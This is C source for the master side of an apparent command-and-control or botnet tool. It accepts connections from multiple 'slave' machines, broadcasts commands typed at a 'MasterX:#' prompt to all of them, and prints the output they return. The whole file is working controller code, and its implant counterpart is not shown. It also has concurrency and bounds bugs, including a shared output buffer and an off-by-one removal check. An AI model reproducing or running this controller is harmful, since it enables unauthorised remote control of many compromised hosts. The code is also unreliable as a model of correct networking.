#include <master.h>


int sock;
size_t received, sent;
char command[BUFFER_SIZE], output[BUFFER_SIZE], error_message[BUFFER_SIZE];
int client_number = 0;
SlaveInfo slave_infos[CLIENT_SIZE];
SlaveInfo slave_info;


/**
 * Gather command output result from slave by client
 * @param slave_info - Saved infos from client when accepting connection
 */
void* get_output(void* slave_info){
	//-fprintf(stdout, "[+] Thread created for output on the slave\n");
	SlaveInfo client = *((SlaveInfo*)slave_info);
	while (1){
		//-fprintf(stdout, "\n[+] Waiting for output from %s:%ld...\n", client.ip, client.port);
		// empty the output buffer
		memset(output, 0, sizeof(output));
		received = recv(client.sock, (void*)(&output), sizeof(output), 0);
		if (received == -1){
			fprintf(stderr, "[-] Error occured while receiving\n");
			sleep(1);
			continue;
		}
		fprintf(stdout, "\nOutput from %s:%ld \n%s\n", client.ip, client.port, output);
		fprintf(stdout, "---------------------------------------\n");
	}
	pthread_exit(NULL);
}


void* accept_connection(void* arg){
	int result_get_output;
	pthread_t thread_get_ouput;	
	int *psock;
	int client_sock;
	while (1){
		struct sockaddr_in client_address;
		int client_address_len = sizeof(client_address);
		client_sock = accept(sock, (struct sockaddr* )&client_address, &client_address_len);
		if (client_sock == -1){
			perror("[-] Error while accepting the connection");
			return;
		}
		//-fprintf(stdout, "[+] Connection established with client\n");// on %s:%ld\n", slave_info.ip, slave_info.port);
		if (client_number>=CLIENT_SIZE){
			fprintf(stderr, "[-] client max number reached...\n");
			continue;
		}else{
			// save slave informations for later use
			slave_infos[client_number].sock = client_sock;
			slave_infos[client_number].ip = inet_ntoa(client_address.sin_addr);
			slave_infos[client_number].port = client_address.sin_port;
			slave_infos[client_number].send_attempt = 0;
			result_get_output = pthread_create(&thread_get_ouput, NULL, get_output, (void*)&slave_infos[client_number]);
			client_number++;
			// create a thread for receiving command output
		}

		
	}
	pthread_exit(NULL);
}


void remove_slave(int position){
	// simple delete with table data structure
	if (position < 0 || position > client_number){
		fprintf(stderr, "[-] Could not remove slave at position %d. Ignoring...\n", position);
		return;
	}
	int k;
	for (k=position; k<client_number-1; k++)
		slave_infos[k] = slave_infos[k+1];
	client_number--;
	fprintf(stderr, "[-] Slave removed from the list due to error\n");
}


/**
 * get command to send from stdin
 * @return status | 0 success | -1 error
 */
int get_command(){
	char* line;
	int compte;
	line = fgets(command, BUFFER_SIZE, stdin);
	if (line == NULL){
		fprintf(stderr, "[-] Error while reading command from master. Ignoring...\n");
		return -1;
	}

	compte = sscanf(line, "%[^\n]s", command);
	if (compte != 1){
		fprintf(stderr, "[-] Error while converting string\n");
		return -1;
	}
	return 0;
}


int send_command(char* command){
	//-fprintf(stdout, "[+] Sending command to clients...\n");
	int i;
	if (client_number <= 0){
		fprintf(stdout, "[+] No slave connected to master\n");
		return 0;
	}
	for (i=0; i<client_number; i++){	
		sent = send(slave_infos[i].sock, (void *)command, strlen(command), MSG_CONFIRM | MSG_NOSIGNAL);
		if (sent == -1){
			sprintf(error_message, "[-] Error occured while sending to client %s:%ld", slave_infos[i].ip, slave_infos[i].port);
			perror(error_message);
			// plan to add remove slave to pending operation till end of send
			if (slave_infos[i].send_attempt >= MAX_SEND_ATTEMPT){
				remove_slave(i);
				continue;
			}
			slave_infos[i].send_attempt++;
			continue;
		}
		//-fprintf(stdout, "[+] Sent %d bytes : %s\n", sent, output);
	}
	//-fprintf(stdout, "[+] Command sent to all clients\n");
	return 0;
}


int start_server(int port){

	// create socket 
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == -1){
		perror("Error while creating socket");
		return -1;
	}
	printf("Socket created successfully\n");


	struct sockaddr_in server_address;
	memset(&server_address, 0, sizeof(server_address));
	server_address.sin_family = AF_INET;
	server_address.sin_port = htons(port); // port number
	server_address.sin_addr.s_addr = INADDR_ANY; // set address to 0.0.0.0 or inet_addr("0.0.0.0")


	int bind_res = bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));
	if (bind_res == -1){
		perror("Error while binding to the address");
		return -1;
	}
	printf("Bind successfully\n");


	int listen_res = listen(sock, 10);
	if (listen_res == -1){
		perror("Error while listening to the address");
		return -1;
	}
	printf("Listen successfully\n");
}


/**
 * Close the file descriptor
 * @return status | 0 on success | -1 on error
 */
int stop_server(){
	// close the file descriptor
	int res = close(sock);
	if (res != 0){
		perror("[-] Error while closing the socket file descriptor");
		return -1;
	}
	fprintf(stdout, "[+] Socket closed successfully\n");
	return 0;
}


void signal_handler(int sig){
	signal(sig, SIG_IGN);
	fprintf(stdout, "\nStop master server ? [y/n] ");
	char c = getchar();
	if (c == 'y' || c == 'Y'){
		quit();
		exit(EXIT_SUCCESS);
	}
}


void quit(){
	stop_server();
	// Stop what was started. 
	// Close what was opened
	// kill non daemon thread...
}


int main(int argc, char** argv){

	if (argc<2){
		fprintf(stdout, "Usage : %s port\n", argv[0]);
		fprintf(stdout, "Master binary that start the server socket to connect to the selected port\n");
		return -1;
	}

	int port = atoi(argv[1]);
	int res = start_server(port);
	if (res == -1){
		fprintf(stderr, "[-] Couldn't start the server. Aborting...\n");
		return (EXIT_FAILURE);
	}

	// capture ctrl+c event
	signal(SIGINT, signal_handler);


	pthread_t thread_accept;
	int result_accept = pthread_create(&thread_accept, NULL, accept_connection, NULL);
	while (1){
		fprintf(stdout, "MasterX:# ");
		res = get_command();
		if (res == -1){
			fprintf(stderr, "[-] Error while getting command... Ignoring.\n");
			continue;
		} 	
		send_command(command);
	}
	

	quit();
	return 0;
}